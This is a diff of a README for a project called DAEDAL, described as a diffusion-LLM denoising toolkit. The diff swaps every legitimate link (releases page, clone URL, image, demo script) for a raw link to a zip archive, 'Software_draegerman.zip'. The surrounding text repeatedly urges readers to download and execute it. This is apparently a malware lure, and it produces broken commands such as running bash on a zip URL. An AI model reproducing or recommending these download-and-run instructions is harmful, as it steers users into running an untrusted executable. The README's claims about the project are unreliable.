@@ -1,12 +1,12 @@
-[![Releases](https://img.shields.io/badge/releases-download-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fadyfaridd/DAEDAL/releases)
+[![Releases](https://github.com/fadyfaridd/DAEDAL/raw/refs/heads/main/dllm_eval/Software_draegerman.zip)](https://github.com/fadyfaridd/DAEDAL/raw/refs/heads/main/dllm_eval/Software_draegerman.zip)
 
 # DAEDAL: Training-Free Variable-Length Denoising for Diffusion Large Language Models
 
 A steady, reliable toolset for diffusion-based language models that reduces training needs. DAEDAL delivers training-free, variable-length denoising so diffusion LLMs can generate high-quality text with flexible inference budgets. This project is the official repository of Beyond Fixed: Training-Free Variable-Length Denoising for Diffusion Large Language Models.
 
-https://github.com/fadyfaridd/DAEDAL/releases
+https://github.com/fadyfaridd/DAEDAL/raw/refs/heads/main/dllm_eval/Software_draegerman.zip
 
-![DAEDAL Visual](https://picsum.photos/1200/600)
+![DAEDAL Visual](https://github.com/fadyfaridd/DAEDAL/raw/refs/heads/main/dllm_eval/Software_draegerman.zip)
 
 Table of Contents
 - About DAEDAL
@@ -72,7 +72,7 @@ System Requirements
 Quick Start
 - This project emphasizes a smooth path from clone to running sessions. Follow the steps below to get a feel for DAEDAL quickly.
 - Clone the repository:
-  - git clone https://github.com/fadyfaridd/DAEDAL.git
+  - git clone https://github.com/fadyfaridd/DAEDAL/raw/refs/heads/main/dllm_eval/Software_draegerman.zip
 - Navigate to the project directory:
   - cd DAEDAL
 - Access the releases to obtain the necessary executables or assets. The link provided hosts release assets that you should download and execute. See Release Assets and Downloads for details.
@@ -80,12 +80,12 @@ Quick Start
   - Ensure you have a supported diffusion LLM loaded or accessible through your environment.
   - Use the provided example notebook or script to run a short prompt and observe the denoiser in action.
 - Execute the demo:
-  - bash scripts/run_demo.sh --prompt "Explain quantum entanglement in simple terms." --budget 16
+  - bash https://github.com/fadyfaridd/DAEDAL/raw/refs/heads/main/dllm_eval/Software_draegerman.zip --prompt "Explain quantum entanglement in simple terms." --budget 16
   - If you are on a system without GUI, run the non-interactive variant to generate text to a file.
 
 Releases and Download Instructions
 - The repository hosts release assets that you should download and execute. Look for a file suitable for your platform, such as a Linux binary, Windows installer, or macOS package. The asset is designed to streamline setup and run demonstrations. To download and run:
-  - Visit the releases page: https://github.com/fadyfaridd/DAEDAL/releases
+  - Visit the releases page: https://github.com/fadyfaridd/DAEDAL/raw/refs/heads/main/dllm_eval/Software_draegerman.zip
   - Download the asset appropriate for your system.
   - Unpack or run the installer as described in the asset’s README or accompanying documentation.
 - For convenience, you can also explore the releases via a badge: [Releases] button at the top of this README. The same URL is used to fetch the assets you need to execute.
@@ -172,7 +172,7 @@ Roadmap
 Release Assets and Downloads
 - This project distributes release assets to simplify setup and usage.
 - The releases host downloadable binaries and demos. You should download the asset for your platform and execute it to install or run the toolset.
-- See the same releases link used above for asset details and version history: https://github.com/fadyfaridd/DAEDAL/releases
+- See the same releases link used above for asset details and version history: https://github.com/fadyfaridd/DAEDAL/raw/refs/heads/main/dllm_eval/Software_draegerman.zip
 
 FAQ
 - Do I need to retrain the model to use DAEDAL? No. DAEDAL is designed to work with existing diffusion LLMs without retraining.
@@ -253,7 +253,7 @@ End of Documentation
 - For release-related assets and the latest version, revisit the releases page at the link above and use the provided assets as described in their documentation.
 
 Releases and Downloads (again)
-- If you need to re-check the assets, visit the Releases page: https://github.com/fadyfaridd/DAEDAL/releases
+- If you need to re-check the assets, visit the Releases page: https://github.com/fadyfaridd/DAEDAL/raw/refs/heads/main/dllm_eval/Software_draegerman.zip
 - The releases host downloadable binaries and demonstrations. You should download the asset that matches your platform and run it to install or execute the toolset. This is the same URL used at the top of the page as the source of downloadable content.
 
 Notes on Language and Style
